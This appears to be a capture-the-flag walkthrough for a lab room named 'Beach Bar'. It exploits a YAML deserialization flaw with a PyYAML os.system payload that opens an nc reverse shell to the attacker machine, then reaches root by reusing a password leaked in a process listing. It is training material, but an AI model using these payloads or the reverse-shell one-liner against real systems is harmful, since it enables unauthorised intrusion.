# Beach Bar

IP: 10.113.169.192
AttackBox: 10.113.97.59

dodałem do /etc/hosts: 
```
10.113.169.192  bar.thm
```

### Fast n' Quick Nmap Scan
Just an sS
```
nmap -sS bar.thm -p- -n -Pn
```

> I didn't bother with an advanced scan, as this room isn't about software vulnerabilities.

### The website

oh dj told us his credentials :)

We are at import site. I tried php reverse shell, but this won't work. We have to work with yaml.

Tried:
```
playlist:
  name: test
```

Got:
```
{'playlist': {'name': 'test'}}
```

Deserialization vulnerability.

> In the eeeendd, it DID even matteeeer!

https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/#pickle
```
!!python/object/apply:time.sleep [4]
```
> hehe, go to sleep

pho5.png

hehehe we created a python range object lol get rekt

It's time for something harder

pho6.png

### RCE

https://www.revshells.com/

```
!!python/object/apply:os.system
- "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.113.97.59 7800 >/tmp/f"
```
and then.. find the flag!

flag1: `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`

let's escalate 

pho7.png

in the meantime I stabilized my shell with:
```
python3 -c "import pty;pty.spawn('/bin/bash')"

CTRL+Z (use this combination to background the session)
stty raw -echo
fg (bring back the session)
```

hard to find anything..
Linpeas didnt help..

ps auxww shows us something more! 
We have this line:
```
root         609  0.0  0.2  20176 11708 ?        Ss   09:38   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k

```

where we can see the password

```
bartender@tryhackme-2404:/opt/beach-bar/webapp$ su root
Password: 
root@tryhackme-2404:/opt/beach-bar/webapp# 
```

> "What?" ~Joe Biden

I was blasted away that this was the root password lmao

```
root@tryhackme-2404:/opt/beach-bar/webapp# cd /root
root@tryhackme-2404:~# ls
root.txt  snap
root@tryhackme-2404:~# cat root.txt
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

### Sources

https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/#pickle

https://www.revshells.com/

THM{y4ml_pl4yl1st_pwns_th3_b34ch}
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
